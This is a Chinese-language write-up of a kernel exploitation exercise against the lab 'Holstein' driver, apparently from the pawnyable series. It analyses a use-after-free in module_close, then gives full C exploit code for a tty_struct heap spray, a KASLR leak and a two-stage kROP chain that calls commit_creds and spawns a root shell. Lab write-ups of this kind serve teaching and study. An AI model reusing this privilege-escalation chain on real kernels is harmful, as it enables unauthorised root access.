# 漏洞函数分析

根据源码可以看到本次实验与之前几次实验不同的地方。

首先就是module_open，在对于g_buf的分配上，使用了一个新的分配函数：kzalloc

这个函数可以看做是kmalloc和memset函数的结合，用于分配一段经过零初始化的连续内存。

module_read，与之前没有什么区别，但是加上了一个边界检查，防止越界读取。

module_write，也是与之前没有什么区别，仍然加上了一个边界检查，防止堆栈溢出。

这次的重点就是这个module_close函数：

```c
static int module_close(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_close called\n");
  kfree(g_buf);
  return 0;
}
```

这个函数其实直接看是没什么问题的，在关闭驱动时将g_buf的对应内存释放掉。

但是如果我们对这个驱动同时打开两次，在内核空间中，有打开该设备文件的实例（也就是fd），都会共享同一个g_buf指针。那么假如存在fd1和fd2，那么当我们close(fd1)之后，似乎g_buf被释放了，但是在fd2中，我们仍然可以通过g_buf访问和修改那块在fd1中应该被释放了的内存。

另外，在这种机制的影响下除了UAF，也会出现内存泄漏的问题。当第二次open的时候，g_buf被更新到第二次打开的这个新的g_buf上，这就导致之前旧的g_buf没有被释放也没有被使用，形成了内存泄漏。

# 利用思路

在存在这个UAF的情况下，可以尝试堆喷配合UAF来劫持一个控制结构。

与堆溢出中类似，可以尝试：

```c
int fd1 = open( "/dev/holstein" , O_RDWR); 
int fd2 = open( "/dev/holstein" , O_RDWR); 
...
close(fd1); 
write(fd2, "Hello" , 5 );
```

可以尝试在打开fd2并close掉fd1之后进行堆喷，将fd1中被释放的g_buf堆块通过堆喷分配给一个tty_strcut或是其他的什么控制结构，然后就可以按照堆溢出中的思路进行利用。所以总体上利用的方式其实与堆溢出很相似。

# KASLR

在存在UAF且堆喷成功将一个tty_struct结构体喷射到原本g_buf对应位置上的前提下，泄露kernel base和g_buf地址的操作就非常简单了。

泄露的基址的代码为：

```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define DEVICE "/dev/holstein"
#define SPRAY_NUM 100
#define OPS_OFFSET 0xc39c60

uint64_t g_buf = 0;
uint64_t kernel_base = 0;
uint64_t base = 0xffffffff81000000;
int spray[SPRAY_NUM];

int main() {
  int fd1 = open(DEVICE, O_RDWR);
  int fd2 = open(DEVICE, O_RDWR);
  char buf[0x100];

  if (fd1 == -1 || fd2 == -1) {
    perror("open");
    return 1;
  }

  close(fd1);

  for (int i = 0; i < SPRAY_NUM; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  read(fd2, buf, 0x40);

  uint64_t *ptr = (uint64_t *)buf;

  kernel_base = ptr[3] - OPS_OFFSET;
  g_buf = ptr[7] - 0x38;

  printf("[+] kernel_base: 0x%lx\n", kernel_base);
  printf("[+] g_buf: 0x%lx\n", g_buf);

  return 0;
}
```

# kROP

首先想到的还是利用ROP提权，但是我最开始尝试只利用一次UAF，利用代码如下：

```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define DEVICE "/dev/holstein"
#define SPRAY_NUM 100
#define OPS_OFFSET 0xc39c60

uint64_t g_buf = 0;
uint64_t kernel_base = 0;
uint64_t base = 0xffffffff81000000;
int spray[SPRAY_NUM];

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t stack_pivot = 0xffffffff8114fbea;

void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
  puts("[+] win!");
  exit(0);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

int main() {
  save_userland_state();

  int fd1 = open(DEVICE, O_RDWR);
  int fd2 = open(DEVICE, O_RDWR);
  char buf[0x400];

  if (fd1 == -1 || fd2 == -1) {
    perror("open");
    return 1;
  }

  close(fd1);

  for (int i = 0; i < SPRAY_NUM; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  read(fd2, buf, 0x400);

  uint64_t *ptr = (uint64_t *)buf;

  kernel_base = ptr[3] - OPS_OFFSET;
  g_buf = ptr[7] - 0x38;

  printf("[+] kernel_base: 0x%lx\n", kernel_base);
  printf("[+] g_buf: 0x%lx\n", g_buf);

  for (int i = 0; i < 0x60; i++) {
    ptr[i] = 0xffffffffdead0000 + i;
  }

  ptr[3] = g_buf

  write(fd2, buf, 0x400);

  for (int i = 0; i < SPRAY_NUM; i++) {
    ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
  }

  for (int i = 0; i < SPRAY_NUM; i++)
    close(spray[i]);

  return 0;
}

// ffffffff81269780
// ioctl(fd, rcx, rdx)
```

我想将tty_struct（也就是g_buf本身）作为一个fake ops函数表，但是无法触发劫持，根据网上的资料猜测是因为这样的操作破坏了 tty_struct中原生的一些字段，所以应该是不能直接只利用这一块内存。

pwnyable的原作者采用了两次UAF来完成提权操作。

*tips：我刚开始有个疑问就是为什么fd1 fd2会用同一块g_buf内存，而fd3 fd4会用另一块内存。原因是在分配fd3 fd4之前的close(fd1)，内核会把fd1 fd2那块内存标记为可能被其他对象使用，所以就重新分配了一次内存给fd3 fd4*

即用一块内存作为放置ROP链和fake ops函数表的区域 ，一块内存作为tty_struct结构体来劫持它的ops函数表。

具体的exp为：

```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define DEVICE "/dev/holstein"
#define SPRAY_NUM 100
#define OPS_OFFSET 0xc39c60

uint64_t g_buf = 0;
uint64_t kernel_base = 0;
uint64_t base = 0xffffffff81000000;
int spray[SPRAY_NUM];

void spawn_shell();

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t)spawn_shell;
uint64_t stack_pivot =
    0xffffffff8114fbea; // push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret;
uint64_t pop_rdi_ret = 0xffffffff8114078a;
uint64_t pop_rcx_ret = 0xffffffff810eb7e4;
uint64_t mov_rdi_rax_movsq_ret = 0xffffffff81638e9b;
uint64_t commit_creds = 0xffffffff810723c0;
uint64_t prepare_kernel_cred = 0xffffffff81072560;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81800e10;

void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
  puts("[+] win!");
  exit(0);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

int main() {
  save_userland_state();

  int fd1 = open(DEVICE, O_RDWR);
  int fd2 = open(DEVICE, O_RDWR);
  char buf[0x400];

  if (fd1 == -1 || fd2 == -1) {
    perror("open");
    return 1;
  }

  close(fd1);

  for (int i = 0; i < SPRAY_NUM / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  read(fd2, buf, 0x400);

  uint64_t *ptr = (uint64_t *)buf;

  kernel_base = ptr[3] - OPS_OFFSET;
  g_buf = ptr[7] - 0x38;

  //   kernel_base = *(unsigned long *)&buf[0x18] - OPS_OFFSET;
  //   g_buf = *(unsigned long *)&buf[0x38] - 0x38;

  printf("[+] kernel_base: 0x%lx\n", kernel_base);
  printf("[+] 1st g_buf: 0x%lx\n", g_buf);

  uint64_t *rop_chain = (uint64_t *)buf;
  *rop_chain++ = pop_rdi_ret - base + kernel_base;
  *rop_chain++ = 0;
  *rop_chain++ = prepare_kernel_cred - base + kernel_base;
  *rop_chain++ = pop_rcx_ret - base + kernel_base;
  *rop_chain++ = 0;
  *rop_chain++ = mov_rdi_rax_movsq_ret - base + kernel_base;
  *rop_chain++ = commit_creds - base + kernel_base;
  *rop_chain++ =
      swapgs_restore_regs_and_return_to_usermode - base + kernel_base + 22;
  *rop_chain++ = 0;
  *rop_chain++ = 0;
  *rop_chain++ = user_rip;
  *rop_chain++ = user_cs;
  *rop_chain++ = user_rflags;
  *rop_chain++ = user_sp;
  *rop_chain++ = user_ss;

  *(uint64_t *)&buf[0x3f8] = stack_pivot - base + kernel_base; // stack pivot

  puts("[*] build the rop chain");

  write(fd2, buf, 0x400);

  int fd3 = open(DEVICE, O_RDWR);
  int fd4 = open(DEVICE, O_RDWR);

  if (fd3 == -1 || fd4 == -1) {
    perror("open");
    return 1;
  }

  close(fd3);

  for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  read(fd4, buf, 0x400);

  *(uint64_t *)&buf[0x18] = g_buf + 0x3f8 - 12 * 8;
  // 函数表中触发的对应函数是在0xc位置上的函数，所以这里的偏移要减去12个8字节

  puts("[*] overwrite tty_struct ops pointer");

  write(fd4, buf, 0x20);

  for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++) {
    ioctl(spray[i], 0, g_buf - 8);
    // gadget中多余的一个pop操作会让rsp加一个8字节，所以这里要提前减掉
  }

  close(fd2);
  close(fd4);

  for (int i = 0; i < SPRAY_NUM; i++)
    close(spray[i]);

  return 0;
}

// ffffffff81269780
// ioctl(fd, rcx, rdx)
```

# AAW/AAR

UAF也可以利用前面堆溢出中的那个AAW/AAR的思路，手法与堆溢出基本一致，这里就不再写一遍了。